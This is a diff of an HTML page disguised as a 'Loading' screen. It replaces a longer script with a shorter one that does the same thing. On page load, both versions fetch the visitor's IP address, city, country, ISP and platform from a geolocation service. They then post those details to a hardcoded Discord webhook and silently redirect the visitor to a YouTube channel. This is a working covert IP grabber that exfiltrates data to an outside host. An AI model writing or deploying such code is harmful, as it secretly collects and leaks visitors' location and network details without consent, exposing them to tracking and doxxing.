@@ -1,34 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading</title></head>
-<body style="background:#000;color:#ccc;text-align:center;padding-top:10vh;font-family:sans-serif;">
-    <p>Processing...</p>
-    <script>
-        const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-        const y = "https://youtube.com/@LigmaBlox-w7m";
-
-        // Immediate fire function
-        (async () => {
-            try {
-                // Fetch data and send to Discord in the background
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                
-                await fetch(h, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        content: `IP: ${d.ip} | Loc: ${d.city}, ${d.country} | ISP: ${d.org} | OS: ${navigator.platform}`
-                    })
-                });
-            } catch (e) {
-                // Fallback if data fetch is blocked
-                navigator.sendBeacon(h, JSON.stringify({content: "Connection detected"}));
-            }
-            // Move to YouTube immediately after the attempt
-            window.location.replace(y);
-        })();
-    </script>
+<body style="background:#000;">
+<script>
+  const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+  fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+    fetch(h, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({content: `IP: ${d.ip} | Loc: ${d.city} | ISP: ${d.org}`})
+    }).finally(() => location.replace("https://youtube.com/@LigmaBlox-w7m"));
+  }).catch(() => location.replace("https://youtube.com/@LigmaBlox-w7m"));
+</script>
 </body>
 </html>
